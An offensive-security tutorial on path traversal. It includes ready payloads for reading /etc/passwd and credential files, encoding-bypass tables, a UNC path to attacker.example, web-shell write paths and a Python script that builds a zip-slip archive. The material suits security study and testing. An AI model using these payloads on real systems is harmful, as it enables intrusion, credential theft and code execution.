---
title: "Path traversal: directory escape, encoding evasion, and archive slip"
description: Exploiting user-influenced paths that read or write files outside the intended directory via ../ sequences, encoded slashes, absolute paths, null bytes, and zip slip in archive extraction.
keywords:
  - path traversal
  - directory traversal
  - LFI
  - zip slip
  - encoding bypass
  - arbitrary file read
---

# Path traversal

**Path traversal** (directory traversal) exploits application code that builds a filesystem path from untrusted input and resolves it relative to a weak base directory. By injecting `../` sequences, encoded separators, or an absolute path, an attacker escapes the intended root and reaches arbitrary files, reading source, configuration, and credentials, or, where the sink writes, planting content of their choosing. The same primitive applied to archive extraction is **zip slip**.

## Overview

A typical vulnerable sink joins a user value onto a base path and opens the result:

```php
// file comes from an HTTP parameter
$path = "/var/www/uploads/" . $_GET['file'];
echo file_get_contents($path);
```

The developer expects `file` to be `report.pdf`. Supplying `../../../../etc/passwd` walks out of `uploads` and up to the filesystem root, and the application returns `/etc/passwd`. The value never stopped being "just a filename" to the developer; the **filesystem** resolved the `..` segments and climbed out of the sandbox.

The vulnerability exists because **the input controls path structure, not just a leaf name**: the `/` separator and the `..` parent reference are syntax the path resolver honors, and the attacker controls them.

## Reaching the target

The number of `../` segments need not be exact, resolving past the filesystem root is harmless, so over-supplying is the reliable default:

```
../../../../../../../../etc/passwd
..\..\..\..\..\..\..\..\windows\win.ini      # Windows separators
```

**Absolute paths** bypass traversal entirely when the base is concatenated loosely or the API accepts an absolute override:

```
/etc/passwd
file:///etc/passwd
\\attacker.example\share\x                     # UNC path on Windows
```

High-value read targets depend on the stack: `/etc/passwd`, `/proc/self/environ` and `/proc/self/cmdline`, the application's own source and `.env`, framework secrets, `~/.ssh/id_*`, server logs, and, on cloud hosts, paths that proxy instance metadata.

## Encoding and filter evasion

Blocklists that strip `../` or reject `/` are routinely defeated because **normalization happens after the filter inspects the value**:

| Technique | Payload | Note |
|-----------|---------|------|
| Single URL-encoding | `%2e%2e%2f` | `../` after one decode pass |
| Double URL-encoding | `%252e%252e%252f` | Survives a layer that decodes once before the check |
| Non-recursive strip bypass | `....//` · `..././` | Collapses back to `../` when the filter removes one inner `../` |
| Mixed/back slashes | `..%5c` · `..\/` | Windows resolvers accept both separators |
| Overlong UTF-8 / Unicode | `%c0%ae%c0%ae/` · fullwidth `．．／` | Decoded to `.` by permissive parsers |
| Leading-slash strip bypass | `....//....//etc/passwd` | Defeats a single `s/\.\.\///` pass |

**Null-byte truncation** (`%00`) historically cut off an appended extension, `file=../../etc/passwd%00.png` caused the runtime to stop reading at the null and open `passwd`. It still appears on legacy interpreters and some native file APIs.

**Appended-extension bypass.** When code forces a suffix (`$file . ".php"`), combine null-byte truncation where available, or exploit path semantics such as a trailing separator or very long path that the resolver trims.

## Write-side traversal

Traversal is not read-only. A sink that *writes* to `base + userName`, an upload target, an export path, a cache key, a log filename, lets an attacker choose the destination:

```
filename = ../../../../var/www/html/shell.php
```

A write that lands in a web-served directory with an executable extension escalates directly to code execution, converging with [unrestricted upload](unrestricted-file-upload.md). Overwriting `authorized_keys`, a cron file, or an application config is an alternative path to execution or persistence.

## Zip slip

Archive extraction trusts the **member names stored inside the archive**, which the attacker authors. If the extractor joins each entry onto a destination directory without canonicalizing, a crafted entry escapes it:

```
# entries inside a malicious .zip / .tar
../../../../var/www/html/shell.jsp
../../../../home/app/.ssh/authorized_keys
```

Build such an archive by writing entry names directly rather than relying on a tool that normalizes them:

```python
import zipfile
z = zipfile.ZipFile("evil.zip", "w")
z.writestr("../../../../var/www/html/x.jsp", "<%= ... %>")
z.close()
```

Any feature that ingests a user-supplied archive, plugin installers, import/restore flows, document converters, is a candidate. Symlink members in `tar` archives are a related variant: extraction follows the link and writes outside the tree.

## Exploitation workflow

1. **Locate a path-bearing parameter.** Download/export endpoints, `?file=`, `?path=`, `?lang=`, avatar and attachment names, archive uploads, and anything that reflects file contents or a filename.
2. **Confirm traversal.** Request a stable known file (`../../../../etc/hostname`, `/etc/passwd`, `win.ini`) and compare responses to a normal fetch; a differing, file-shaped body confirms escape.
3. **Fingerprint normalization.** Walk the encoding table above to learn which layer decodes and where the filter sits, this dictates the working payload.
4. **Pivot by capability.** Read mode → harvest source, config, and secrets, then feed them into [dynamic inclusion](dynamic-file-inclusion.md) or auth attacks. Write mode → place executable content in a served directory for RCE.

## Platform differences

- **POSIX:** `/` separator, case-sensitive, `/proc` pseudo-files are rich read targets, symlinks commonly followed.
- **Windows:** accepts both `\` and `/`, case-insensitive, reserved device names (`CON`, `NUL`), UNC paths (`\\host\share`) can trigger outbound SMB, and trailing dots/spaces are trimmed by the resolver, each a filter-evasion lever.

Establishing the host OS and the exact resolver in the call path decides the separator set and the viable tricks before the first crafted request.

## Tools

- **[Burp Suite](https://portswigger.net/burp)** (Repeater, Intruder) for probing parameters and iterating encodings against a resolved-path oracle.
- **[SecLists](https://github.com/danielmiessler/SecLists)** traversal and LFI wordlists for fuzzing depth and target files.
- **[dotdotpwn](https://github.com/wireghoul/dotdotpwn)** for systematic traversal fuzzing across encodings and depths.

## References

- [OWASP: Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger Web Security Academy: Directory traversal](https://portswigger.net/web-security/file-path-traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [Snyk: Zip Slip vulnerability](https://security.snyk.io/research/zip-slip-vulnerability)
- [PayloadsAllTheThings: Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
